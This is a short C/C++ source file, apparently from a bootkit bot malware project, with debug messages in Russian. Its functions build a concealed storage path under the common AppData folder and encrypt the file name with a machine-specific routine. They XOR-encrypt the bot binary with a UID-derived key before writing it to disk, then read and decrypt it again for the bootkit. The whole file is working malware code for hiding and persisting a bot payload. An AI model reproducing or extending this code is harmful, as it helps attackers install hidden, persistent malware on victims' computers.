#include "BootkitCrypt.h"
#include "GetApi.h"
#include "crypt.h"
#include "Utils.h"
#include <Shlobj.h>
#include "BotDebug.h"

char* NameFileForBootkit( char* buf, int c_buf )
{
	if( buf == 0 || c_buf < MAX_PATH ) return 0;

	pSHGetFolderPathA( 0, CSIDL_COMMON_APPDATA ,  0, 0, buf );
	pPathAppendA( buf, "BootkitBot.dat" );
	char* res = UIDCrypt::CryptFileName( buf, false );
	m_lstrcpy( buf, res );
	STR::Free(res);
	return buf;
}

static void XorCrypt( BYTE* data, DWORD c_data )
{
	XORCrypt::Crypt(GetUIDPassword(), data, c_data );
}

bool WriteBotForBootkit( BYTE* data, DWORD c_data )
{
	TMemory mem(c_data);
	m_memcpy( mem.Buf(), data, c_data );
	XorCrypt( data, c_data );
	char fileName[MAX_PATH];
	if( NameFileForBootkit( fileName, sizeof(fileName) ) )
	{
		PP_DPRINTF( "Файл куда записали бот: %s", fileName );
		if( File::WriteBufferA( fileName, data, c_data ) == c_data )
			return true;
	}
	return false;
}

BYTE* ReadBotForBootkit( DWORD& size )
{
	char fileName[MAX_PATH];
	if( NameFileForBootkit( fileName, sizeof(fileName) ) )
	{
		PP_DPRINTF( "Файл с которого считываем бот: %s", fileName );
		if( File::IsExists(fileName) )
		{
			BYTE* data = File::ReadToBufferA( fileName, size );
			XorCrypt( data, size );
			return data;
		}
		else
			PP_DPRINTF( "Файл %s не существует", fileName );
	}
	return 0;
}

